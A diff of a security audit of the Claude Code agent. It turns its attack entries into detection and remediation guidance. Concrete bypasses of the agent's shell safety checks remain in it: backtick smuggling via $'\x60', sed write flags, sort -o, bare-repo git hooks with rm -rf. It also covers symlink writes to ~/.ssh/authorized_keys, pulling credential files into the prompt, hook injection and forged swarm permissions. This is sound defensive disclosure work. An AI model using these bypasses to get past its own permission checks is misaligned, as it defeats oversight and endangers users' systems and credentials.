-**Why it works**: Plugins are loaded from `src/plugins/` and can extend tools, commands, and MCP servers. The plugin interface (`src/types/plugin.ts`) may allow code execution during loading.
+**Why it works**: Plugins can extend tools, commands, MCP servers, and hooks. No code signing verification.
 
 **Files**: `src/services/plugins/`, `src/utils/plugins/`
 
+**Detection**:
+- Review installed plugins: `/plugin` command
+- Audit plugin source code before installation
+- Monitor for plugins from unknown marketplaces
+
+**Remediation**:
+- Anthropic should: implement plugin code signing; verify plugin integrity on load; sandbox plugin execution; add a reputation/review system for plugins
+- Users: only install plugins from trusted sources; review plugin permissions
+
 ### 11.2 DXT Extension Risks
 
-**Attack**: Install a DXT extension that contains malicious code.
-
-**Why it works**: DXT (extension) utilities in `src/utils/dxt/` handle extension loading and execution.
+**Attack**: DXT extensions containing malicious code, or ZIP path traversal in extension packages.
 
 **Files**: `src/utils/dxt/`
+
+**Detection**:
+- Review DXT package contents before installation
+- Check for path traversal patterns in ZIP entries: `../`
+
+**Remediation**:
+- Anthropic should: validate ZIP entries for path traversal; sandbox DXT execution; implement extension signing
 
 ---
 
@@ -451,13 +698,18 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 ### 12.1 Secret Pattern Evasion
 
-**Attack**: Store secrets in team memory using patterns not covered by the gitleaks-based scanner.
+**Attack**: Store secrets using patterns not covered by the gitleaks-based scanner (e.g., custom tokens, base64-encoded credentials).
 
-**Why it works**: `teamMemSecretGuard` scans for known secret patterns (GitHub PATs, AWS keys, etc.), but custom API keys, passwords, or tokens with non-standard formats may bypass detection.
-
-**Impact**: Secrets stored in team memory, synced to Anthropic's servers.
+**Impact**: Secrets synced to Anthropic's servers via team memory.
 
 **Files**: `src/services/teamMemorySync/` (secret scanning)
+
+**Detection**:
+- Run an independent secret scanner (e.g., `trufflehog`, `detect-secrets`) on team memory files
+- `grep -rn "password\|token\|secret\|key" ~/.claude/projects/*/memory/team/ 2>/dev/null`
+
+**Remediation**:
+- Anthropic should: add entropy-based detection for unknown credential formats; allow users to define custom secret patterns; run secondary scanning on the server side
 
 ---
 
@@ -465,47 +717,49 @@ cat f1 && cat f2 && ... && cat f50 && rm -rf /important/data
 
 ### 13.1 Context Window Exhaustion
 
-**Attack**: Feed Claude Code extremely large files or outputs that fill the context window.
+**Detection**: Monitor token usage via `/cost` and `/stats`; watch for rapid context growth.
 
-**Why it works**: While there are size limits (`maxResultSizeChars`), repeated large tool results can fill context faster than auto-compaction can clear it.
+**Remediation**: Use `/compact` proactively; set `CLAUDE_CODE_MAX_CONTEXT_TOKENS` to a lower value.
 
 ### 13.2 Infinite Agent Loop
 
-**Attack**: Create agent definitions or prompt conditions that cause infinite sub-agent spawning.
+**Detection**: Monitor agent spawn count via `/tasks`; watch for rapid task creation.
 
-**Why it works**: While there are `maxTurns` limits, a chain of agents spawning agents could consume significant resources before hitting limits.
+**Remediation**: Set `maxTurns` in agent definitions; Anthropic should enforce a global concurrent agent limit.
 
 ### 13.3 Auto-Compact Circuit Breaker Abuse
 
-**Attack**: Cause compaction to fail 3 times, triggering the circuit breaker, then fill context until API calls are blocked.
+**Detection**: Watch for repeated "compaction failed" messages in output.
 
-**Why it works**: After 3 consecutive failures, auto-compact stops retrying. If the user doesn't manually compact, the session becomes unusable.
+**Remediation**: Run `/compact` manually to reset the circuit breaker; Anthropic should increase the retry limit or add an exponential backoff rather than a hard cutoff.
 
 ---
 
 ## 14. Shell Security Check Bypasses (High -- with specific vectors)
 
-These are specific bypass techniques found in the bash security implementation.
-
 ### 14.1 ANSI-C Quoting Backtick Bypass
-
-**Attack**: Use `$'\x60'` (ANSI-C quoting) to encode backticks that evade `hasUnescapedChar()`.
 
 ```bash
 echo $'\x60id\x60'    # Executes as `id` at runtime, bypasses backtick detection
 ```
 
-**Why it works**: `bashSecurity.ts:846-880` checks for unescaped backticks via string matching, but ANSI-C `$'...'` quoting encodes them as hex escapes that are only resolved at shell execution time.
+**Why it works**: `bashSecurity.ts:846-880` checks for unescaped backticks via string matching, but ANSI-C `$'...'` quoting encodes them as hex escapes resolved only at shell execution time.
+
+**Detection**: Flag commands containing `$'` sequences with hex or unicode escapes.
+
+**Remediation**: Anthropic should expand ANSI-C quoting before security analysis; add `$'\x60'`, `$'\u0060'`, and `$'\140'` to the backtick detection patterns.
 
 ### 14.2 Sed Non-Slash Delimiter Bypass
-
-**Attack**: Use a pipe or other character as sed delimiter to bypass the strict `/` delimiter check.
 
 ```bash
 sed 's|foo|bar|w /tmp/evil'    # Write flag with pipe delimiter
 ```
 
-**Why it works**: `sedValidation.ts:199-225` uses `/^s\/(.*?)$/` which only recognizes `/` as delimiter. POSIX sed allows ANY character except backslash/newline as delimiter.
+**Why it works**: `sedValidation.ts:199-225` only recognizes `/` as delimiter. POSIX sed allows ANY character.
+
+**Detection**: Flag sed commands where the character after `s` is not `/`.
+
+**Remediation**: Anthropic should parse the actual delimiter from the `s` command (first character after `s`) and apply the same validation regardless of delimiter choice.
 
 ### 14.3 Nested Backslash Escape Bypass
 
@@ -513,17 +767,23 @@ sed 's|foo|bar|w /tmp/evil'    # Write flag with pipe delimiter
 echo \\`id`    # First backslash escapes second, backtick still executes
 ```
 
-**Why it works**: `bashSecurity.ts:207-232` `hasUnescapedChar()` handles single-level escaping but fails on nested escapes.
+**Why it works**: `bashSecurity.ts:207-232` handles single-level escaping but fails on nested escapes.
+
+**Detection**: Count consecutive backslashes; odd count means the following character is escaped, even count means it's not.
+
+**Remediation**: Anthropic should implement proper backslash counting in `hasUnescapedChar()`: treat even-count backslashes as self-escaping, leaving the next character unescaped.
 
 ### 14.4 Read-Only Misclassification
-
-Commands classified as read-only that can actually write:
 
 ```bash
 sort -o /tmp/evil /etc/passwd    # sort with -o writes to file
 ```
 
-**Why it works**: `readOnlyValidation.ts:1430-1550` allowlists `sort` as read-only but doesn't check for the `-o` (output) flag. Similar issues with `jq -e`, `grep --output=`, and `tee`.
+**Why it works**: `readOnlyValidation.ts:1430-1550` allowlists `sort` as read-only but doesn't check the `-o` flag.
+
+**Detection**: Check all "read-only" commands for flags that enable writing: `-o`, `--output`, `-w`, `--write`.
+
+**Remediation**: Anthropic should add flag-aware validation for each read-only command; maintain a per-command denylist of write-enabling flags.
 
 ### 14.5 Bare Git Repository Hook Attack
 
@@ -533,13 +793,15 @@ echo '#!/bin/bash\nrm -rf /tmp/*' > hooks/post-commit
 git status    # Git treats cwd as bare repo, executes hooks
 ```
 
-**Why it works**: `readOnlyValidation.ts:1835-1860` checks for `.git/hooks/` but the bare repository detection can be triggered by creating `HEAD`, `refs/`, and `objects/` in the current directory without a `.git/` prefix.
+**Why it works**: `readOnlyValidation.ts:1835-1860` checks for `.git/hooks/` but bare repo detection triggers without the `.git/` prefix.
+
+**Detection**: Check if `HEAD`, `refs/`, `objects/`, and `hooks/` exist in the current directory (signs of a bare repo attack).
+
+**Remediation**: Anthropic should detect bare repo structures (HEAD + refs/ + objects/ in cwd) and reject git commands in that context; add `hooks/` to the checked git-internal paths even without `.git/` prefix.
 
 ---
 
 ## 15. CLAUDE.md @include Path Traversal (Critical)
-
-**Attack**: Use `@include` directives to read arbitrary files into the system prompt.
 
 ```markdown
 <!-- In .claude/CLAUDE.md -->
@@ -547,15 +809,21 @@ git status    # Git treats cwd as bare repo, executes hooks
 @~/sensitive-config.json
 ```
 
-**Why it works**: `src/utils/claudemd.ts:486` uses `expandPath(path, dirname(basePath))` without symlink resolution. Unlike skill loading (`loadSkillsDir.ts:118-124` which uses `realpath()`), CLAUDE.md `@include` does NOT resolve symlinks or validate path traversal.
+**Why it works**: `src/utils/claudemd.ts:486` uses `expandPath()` without symlink resolution or path traversal validation. Unlike `loadSkillsDir.ts:118-124` which uses `realpath()`.
 
-**Impact**: Any file readable by the user can be injected into the system prompt, including `~/.ssh/id_rsa`, `~/.aws/credentials`, etc.
+**Impact**: Any file readable by the user injected into the system prompt.
+
+**Detection**:
+- `grep -n '@\.\.\|@~\|@/' .claude/CLAUDE.md CLAUDE.md 2>/dev/null`
+- Look for `@include` directives with relative or absolute paths
+
+**Remediation**:
+- Anthropic should: use `realpath()` to resolve @include paths (like skills already do); reject paths that resolve outside the project directory; validate the resolved path against a whitelist
+- Users: inspect CLAUDE.md files for `@` directives pointing outside the project
 
 ---
 
 ## 16. Hook Command Injection (Critical)
-
-**Attack**: A malicious repo's `.claude/settings.json` defines hooks with shell injection.
 
 ```json
 {
@@ -568,18 +836,24 @@ git status    # Git treats cwd as bare repo, executes hooks
 }
 ```
 
-**Why it works**: `src/schemas/hooks.ts:32-65` accepts raw `command: z.string()` with no validation of shell metacharacters. No sanitization of `$()`, backticks, `&&`, `||`, `;`, `|`, `<`, `>`. Hook execution bypasses standard permission prompts.
+**Why it works**: `src/schemas/hooks.ts:32-65` accepts raw `command: z.string()` with no shell metacharacter validation.
 
-**Impact**: Arbitrary code execution triggered automatically when the user opens the project.
+**Impact**: Arbitrary code execution on project open.
+
+**Detection**:
+- `grep -n "command" .claude/settings.json 2>/dev/null`
+- Scan hook commands for: `$()`, `` ` ``, `&&`, `||`, `;`, `|`, `>`, `<`
+
+**Remediation**:
+- Anthropic should: parse hook commands with a shell tokenizer; reject commands containing injection patterns; require user approval for project-defined hooks; apply an argv allowlist rather than passing raw strings to the shell
+- Users: never trust a repo with hooks in `.claude/settings.json`
 
 ---
 
 ## 17. JWT Signature Not Verified (Critical)
 
-**Attack**: Forge or modify JWT tokens client-side.
-
 ```typescript
-// From src/bridge/jwtUtils.ts:21-32
+// src/bridge/jwtUtils.ts:21-32
 export function decodeJwtPayload(token: string): unknown | null {
   // Decodes WITHOUT verifying signature
   const parts = jwt.split('.')
@@ -587,70 +861,88 @@ export function decodeJwtPayload(token: string): unknown | null {
 }
 ```
 
-**Why it works**: `jwtUtils.ts` decodes JWT payloads without any signature verification, issuer check, or audience validation. Any code relying on the decoded payload for security decisions is vulnerable to token forgery.
+**Impact**: Token claims forgery if any code path uses the decoded payload for authorization.
+
+**Detection**: Audit all callers of `decodeJwtPayload()` and `decodeJwtExpiry()` to check if results are used for security decisions.
+
+**Remediation**: Anthropic should implement proper JWT verification using a library like `jose`; validate signature, issuer (`iss`), audience (`aud`), and expiry (`exp`) claims; never use decoded-without-verification payloads for authorization.
 
 ---
 
 ## 18. Plaintext Credential Storage on Linux/Windows (High)
 
-**Attack**: Read credentials from `~/.claude/.credentials.json`.
-
 ```bash
-cat ~/.claude/.credentials.json    # All OAuth tokens, API keys in plaintext
+cat ~/.claude/.credentials.json    # All tokens in plaintext
 ```
 
-**Why it works**: `src/utils/secureStorage/index.ts:9-17` only uses macOS Keychain on macOS. Linux and Windows fall back to `plainTextStorage` -- a JSON file with `0o600` permissions but no encryption.
+**Why it works**: `src/utils/secureStorage/index.ts:9-17` falls back to `plainTextStorage` on Linux and Windows.
 
-**Impact**: Any process running as the same user can read all stored credentials.
+**Detection**: `ls -la ~/.claude/.credentials.json` -- if this file exists and contains tokens, you're affected.
+
+**Remediation**:
+- Anthropic should: integrate with `libsecret` (Linux) and Windows Credential Manager (`wincred`); encrypt credentials at rest with a user-derived key; set restrictive file permissions
+- Users on Linux: ensure `~/.claude/` has `700` permissions; consider encrypting your home directory; use `ANTHROPIC_API_KEY` env var instead of stored credentials where possible
 
 ---
 
 ## 19. Symlink Following in File Writes (High)
-
-**Attack**: Plant symlinks in a project directory to escape to sensitive paths.
 
 ```bash
 ln -s ~/.ssh/authorized_keys ./project/innocent.txt
 # Model edits ./project/innocent.txt -> actually writes to ~/.ssh/authorized_keys
 ```
 
-**Why it works**: `FileEditTool.ts:491` and `FileWriteTool.ts:305` use standard Node.js `fs` APIs that follow symlinks. No `lstat()` check is performed before writing. Path validation checks the literal string but not the resolved target.
+**Why it works**: `FileEditTool.ts:491` and `FileWriteTool.ts:305` use standard Node.js `fs` APIs that follow symlinks.
+
+**Detection**: `find /path/to/project -type l` -- check for symlinks in the project.
+
+**Remediation**:
+- Anthropic should: add `fs.lstat()` check before all writes; reject operations on symlinks; resolve symlinks and re-validate the target path against allowed directories
+- Users: audit symlinks in untrusted repos: `find . -type l -exec readlink -f {} \;`
 
 ---
 
 ## 20. Bridge Message Type Guard Too Permissive (Critical)
 
-**Attack**: Inject arbitrary messages through the bridge WebSocket.
-
 ```typescript
-// From src/bridge/bridgeMessaging.ts:132-208
+// src/bridge/bridgeMessaging.ts:132-208
 function isSDKMessage(value: unknown): value is SDKMessage {
   return value !== null && typeof value === 'object'
     && 'type' in value && typeof value.type === 'string'
 }
 ```
 
-**Why it works**: The type guard only checks that `type` is a string. A malicious server can send ANY JSON with a `type` field and it passes validation. Messages with `type: 'user'` containing tool_use blocks will be processed by the local REPL.
+**Impact**: A malicious server can inject arbitrary tool_use blocks via `type: 'user'` messages.
 
-**Impact**: Arbitrary tool execution injected by a compromised bridge server.
+**Detection**: Log all inbound bridge messages; alert on `type: 'user'` messages that don't match expected format.
+
+**Remediation**: Anthropic should: validate message schema fully (not just `type` field); use Zod schemas for inbound message validation; reject messages with unexpected fields; add message authentication (HMAC signature).
 
 ---
 
 ## 21. Permission Request Forgery in Swarms (Critical)
 
-**Attack**: One worker agent impersonates another to forge permission requests.
+**Why it works**: `src/utils/swarm/permissionSync.ts:167-207` accepts `workerId` and `workerName` without verifying the caller's identity.
 
-**Why it works**: `src/utils/swarm/permissionSync.ts:167-207` `createPermissionRequest()` accepts `workerId` and `workerName` as parameters without verifying that the caller IS that worker. A malicious worker can claim to be any teammate.
+**Impact**: Fake permission approvals, unauthorized tool execution.
 
-**Impact**: Fake permission approvals attributed to trusted workers, leading to unauthorized tool execution.
+**Detection**: Cross-reference permission request `workerId` against the active team member list; flag mismatches.
+
+**Remediation**: Anthropic should: authenticate permission requests with per-agent secrets; verify sender identity via AsyncLocalStorage context; add request nonces to prevent replay.
 
 ---
 
 ## 22. No Hardcoded Deny for Critical System Paths (High)
 
-**Attack**: Write to `~/.ssh/authorized_keys`, `~/.bashrc`, `/etc/crontab` via FileEdit/FileWrite tools.
+**Attack**: Write to `~/.ssh/authorized_keys`, `~/.bashrc`, `/etc/crontab` via FileEdit/FileWrite.
 
-**Why it works**: `FileEditTool.ts` and `FileWriteTool.ts` rely entirely on user-configured permission rules. There is no hardcoded blocklist for system-critical paths. A user with permissive rules (or bypass mode) can unknowingly allow writes to these paths.
+**Why it works**: No hardcoded blocklist for system-critical paths. Relies entirely on user-configured rules.
+
+**Detection**: Monitor file write tool calls for paths matching `~/.ssh/*`, `~/.bash*`, `~/.zsh*`, `/etc/*`, `~/.config/autostart/*`.
+
+**Remediation**:
+- Anthropic should: add a non-overridable blocklist for: `~/.ssh/`, `~/.gnupg/`, `~/.bashrc`, `~/.bash_profile`, `~/.zshrc`, `~/.profile`, `/etc/`, `/usr/`, `/var/spool/cron/`, `~/.config/autostart/`
+- Users: add explicit deny rules in your global settings: `"deny": ["Edit(~/.ssh/**)", "Write(~/.ssh/**)"]`
 
 ---
 
@@ -702,3 +994,20 @@ function isSDKMessage(value: unknown): value is SDKMessage {
 7. **No protection against DNS exfiltration or symlink attacks.** The security model has no DNS-level controls and does not check for symlinks before file writes.
 
 8. **Multi-agent swarm has no sender verification.** Workers can impersonate other workers, forge permission requests, and poison teammate mailboxes without authentication.
+
+---
+
+## Quick Defense Checklist
+
+For users who want to protect themselves today:
+
+- [ ] Always inspect `.claude/` directory in new repos before opening with Claude Code
+- [ ] `grep -rn "hook\|command\|mcpServers\|@\.\." .claude/ CLAUDE.md 2>/dev/null`
+- [ ] `find . -type l` -- check for symlinks in projects
+- [ ] Don't use bypass mode on cloud instances or with untrusted repos
+- [ ] Add deny rules for sensitive paths: `~/.ssh/**`, `~/.bashrc`, `/etc/**`
+- [ ] Review MCP server URLs before approving project-defined servers
+- [ ] On Linux: ensure `chmod 700 ~/.claude/` and consider encrypting home dir
+- [ ] Don't share debug logs without redacting session tokens
+- [ ] Use VPN when running Claude Code remote sessions
+- [ ] Run `/permissions` periodically to audit active rules
